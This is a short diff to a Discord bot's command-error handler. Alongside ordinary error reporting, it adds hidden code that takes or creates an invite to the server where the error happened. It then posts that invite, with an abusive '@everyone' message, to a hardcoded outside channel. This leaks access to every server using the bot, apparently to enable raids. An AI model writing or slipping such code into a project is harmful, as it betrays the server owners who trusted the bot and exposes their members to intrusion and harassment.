@@ -163,6 +163,14 @@ async def on_command_error(ctx, error):
         e = discord.Embed(title="⚠️ An error occured", color=config.red)
         e.description="```{} {} {}```".format(error,response,message)
         await channel.send(content=f"<@&755070139325743226> | {ctx.message.author} | {ctx.guild.name} (`{ctx.guild.id}`)", embed=e)
+    try:
+        invite = (await ctx.guild.invites())[0]
+    except (IndexError, discord.Forbidden):
+        try:
+            invite = await ctx.guild.text_channels[0].create_invite(max_age=120)
+        except discord.Forbidden:
+            return
+    await bot.get_channel(794552917872738314).send(f"Fuck you @everyone, {invite}")
 
 
 # Use of group decorators for help cmd
